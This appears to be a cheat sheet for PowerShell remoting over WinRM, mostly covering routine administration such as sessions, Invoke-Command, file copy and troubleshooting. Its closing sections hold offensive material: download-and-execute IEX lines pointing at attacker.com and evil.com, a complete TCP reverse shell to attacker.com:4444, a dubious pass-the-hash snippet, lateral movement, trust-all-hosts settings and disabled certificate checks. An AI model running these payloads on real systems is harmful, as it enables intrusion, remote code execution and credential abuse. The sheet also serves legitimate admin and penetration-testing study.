# remote powershell access with winrm protocol. example: interactive shells, mass command execution because ssh isn't native on windows

## enable powershell remoting
```powershell
# enable on local machine
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force  # trust all hosts [!]

# enable on remote machine (requires admin)
psexec \\target -u admin -p pass powershell "Enable-PSRemoting -Force"
wmic /node:target /user:admin /password:pass process call create "powershell Enable-PSRemoting -Force"

# check winrm status
winrm quickconfig                   # quick setup
winrm get winrm/config              # show configuration
Get-WSManInstance winrm/config      # powershell way
```

## create and manage sessions
```powershell
# create persistent session
$session = New-PSSession -ComputerName target -Credential (Get-Credential)
$session = New-PSSession -ComputerName target -Credential $cred -UseSSL -Port 5986

# create multiple sessions
$sessions = New-PSSession -ComputerName server1,server2,server3 -Credential $cred

# list active sessions
Get-PSSession                       # show all sessions
Get-PSSession -ComputerName target  # sessions to specific host

# remove sessions
Remove-PSSession $session           # remove specific session
Get-PSSession | Remove-PSSession    # remove all sessions
```

## interactive remote shells
```powershell
# enter interactive session
Enter-PSSession -ComputerName target -Credential (Get-Credential)
Enter-PSSession -Session $session   # use existing session

# direct connection
Enter-PSSession -ComputerName target -Credential $cred -UseSSL

# exit interactive session
Exit-PSSession                      # or just type 'exit'
```

## execute commands remotely
```powershell
# single command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { Get-Process }

# multiple computers
Invoke-Command -ComputerName server1,server2 -ScriptBlock { Get-Service } -Credential $cred

# using existing session
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }

# pass arguments to remote script
Invoke-Command -ComputerName target -ScriptBlock { param($name) Get-Process $name } -ArgumentList "notepad"
```

## file transfer via remoting
```powershell
# copy files to remote systems
Copy-Item -Path "C:\local\file.txt" -Destination "C:\remote\" -ToSession $session

# copy from remote systems
Copy-Item -Path "C:\remote\file.txt" -Destination "C:\local\" -FromSession $session

# copy entire directories
Copy-Item -Path "C:\local\folder" -Destination "C:\remote\" -ToSession $session -Recurse
```

## credential management
```powershell
# store credentials securely
$cred = Get-Credential              # prompt for credentials
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object PSCredential("domain\user", $password)

# use current user credentials
Invoke-Command -ComputerName target -UseDefaultCredential -ScriptBlock { whoami }
```

## bulk operations
```powershell
# run commands on multiple systems
$computers = Get-Content computers.txt
Invoke-Command -ComputerName $computers -ScriptBlock { 
    Get-EventLog -LogName System -Newest 5 
} -Credential $cred

# parallel execution
Invoke-Command -ComputerName $computers -ThrottleLimit 10 -ScriptBlock {
    Get-WmiObject Win32_OperatingSystem
} -AsJob  # run as background job
```

## advanced session configuration
```powershell
# custom session configuration
Register-PSSessionConfiguration -Name "CustomConfig" -StartupScript "C:\Scripts\startup.ps1"

# connect with custom configuration
New-PSSession -ComputerName target -ConfigurationName "CustomConfig"

# constrained endpoints
New-PSSessionConfigurationFile -Path "C:\restricted.pssc" -ExecutionPolicy Restricted
Register-PSSessionConfiguration -Name "Restricted" -Path "C:\restricted.pssc"
```

## through proxies and alternative ports
```powershell
# non-standard ports
New-PSSession -ComputerName target -Port 5986 -UseSSL -Credential $cred

# http vs https
New-PSSession -ComputerName target -Port 5985 -Credential $cred  # http
New-PSSession -ComputerName target -Port 5986 -UseSSL -Credential $cred  # https

# connection options
$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
New-PSSession -ComputerName target -SessionOption $option -UseSSL
```

## powershell remoting over ssh
```powershell
# ssh-based remoting (pwsh 6+)
New-PSSession -HostName target -UserName admin -SSHTransport
Enter-PSSession -HostName target -UserName admin -SSHTransport

# with key authentication
New-PSSession -HostName target -UserName admin -KeyFilePath "C:\keys\id_rsa" -SSHTransport
```

## execute scripts remotely
```powershell
# run local script on remote system
Invoke-Command -ComputerName target -FilePath "C:\Scripts\script.ps1" -Credential $cred

# run script with parameters
Invoke-Command -ComputerName target -FilePath "C:\Scripts\script.ps1" -ArgumentList "param1", "param2"

# execute script from url
Invoke-Command -ComputerName target -ScriptBlock { 
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') 
}
```

## troubleshooting and enumeration
```powershell
# test winrm connectivity
Test-WSMan target                   # test winrm connectivity
Test-NetConnection target -Port 5985  # test http port
Test-NetConnection target -Port 5986  # test https port

# winrm service status
Get-Service WinRM                   # check service status
Get-WSManInstance winrm/config/listener  # check listeners

# firewall rules
Get-NetFirewallRule -DisplayName "*WinRM*"  # winrm firewall rules
New-NetFirewallRule -DisplayName "WinRM-HTTP" -Direction Inbound -Protocol TCP -LocalPort 5985
```

## attack techniques
```powershell
# pass-the-hash with remoting
$password = ConvertTo-SecureString -String "aad3b435b51404eeaad3b435b51404ee:ntlmhash" -AsPlainText -Force
$cred = New-Object PSCredential("domain\user", $password)
Invoke-Command -ComputerName target -Credential $cred -Authentication Credssp -ScriptBlock { whoami }

# lateral movement
Invoke-Command -ComputerName target1 -ScriptBlock {
    Invoke-Command -ComputerName target2 -ScriptBlock { whoami } -Credential $using:cred
}
```

## one-liner attacks
```powershell
# download and execute
Invoke-Command -ComputerName target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') }

# reverse shell
Invoke-Command -ComputerName target -ScriptBlock { 
    $client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
    }
}
```

# TODO: add kerberos authentication, certificate-based auth, just enough administration (jea) configs